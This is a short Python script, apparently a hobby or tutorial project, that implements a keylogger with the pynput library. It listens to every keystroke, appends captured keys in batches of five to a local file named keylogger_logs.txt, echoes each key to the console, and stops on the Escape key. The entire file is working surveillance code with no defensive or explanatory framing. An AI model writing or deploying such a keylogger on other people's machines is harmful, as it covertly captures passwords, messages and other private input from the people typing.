import pynput
from pynput.keyboard import Key, Listener


count = 0 
keys = []

def writing_file(keys):
    with open("keylogger_logs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", ",")
            if k.find("space") != -1:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_pressing(key):
    
    global keys, count
    keys.append(key) 
    count += 1
    if count >=5:
       count = 0
       writing_file(keys)
       keys = []
    print("{0} pressed".format(key))

def on_releasing(key):
    if key == Key.esc: 
        return False

with Listener(on_press=on_pressing, on_release=on_releasing) as listener: 
    listener.join()